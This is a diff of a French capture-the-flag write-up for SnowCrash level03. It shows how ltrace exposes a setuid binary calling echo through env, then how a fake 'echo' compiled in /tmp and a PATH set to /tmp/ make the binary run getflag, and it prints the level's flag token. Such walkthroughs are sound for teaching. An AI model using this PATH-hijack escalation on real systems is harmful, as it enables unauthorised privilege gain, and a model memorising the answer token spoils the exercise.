@@ -1,12 +1,38 @@
 #LEVEL 03
 
-We found a binary file named level03 in the home.
+Nous avons trouve un binaire level03 dans le home avec les setuid.
 
-- ltrace ./level03 pour checker les fonctions appelee lors de l'execution de ce binaire
+level03@SnowCrash:~$ ltrace ./level03
+__libc_start_main(0x80484a4, 1, 0xbffff7a4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                                 = 2003
+geteuid()                                                                 = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                       = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                       = 0
+system("/usr/bin/env echo Exploit me"Exploit me
 
--on voit que le fonction system est utilisee pour appeler le echo "exploiter moi
--on va utiliser cela, en creer notre propre echo vu que le binaire a les droit
-d'execution sur les fichiers systemes;
--notre echo permettra dafficher le flag pour le level suivant, en modifiant la
-variable d'environnement pour que le binaire execute notre echo et non celui de
-la machine;
+Avec ltrace, on constate un appel a la fonction system qui lui va lancer un
+echo "Exploit me" via le chemin de la variable d'environnement
+
+Nous allons utiliser les setuid du binaire ici present pour lui faire executer
+getflag. Nous allons creer un script que nous nommerons echo apres compilation,
+puis nous modifieront le PATH dans l'environnement du reel echo par le notre.
+
+Nous compilons notre petit programme en C qui ne fait rien d'autre qu'un appel
+a system qui lui lance /bin/getflag.
+
+level03@SnowCrash:/tmp$ gcc script.c -o echo
+
+Ensuite nous remplacons la variable d'environemment:
+
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+par : PATH=/tmp/
+
+Nous n'avons plus qu'a relancer notre binaire:
+
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+Nous remettons la variable d'environnement pour pouvoir relancer 'su level04'
+
+Next level..
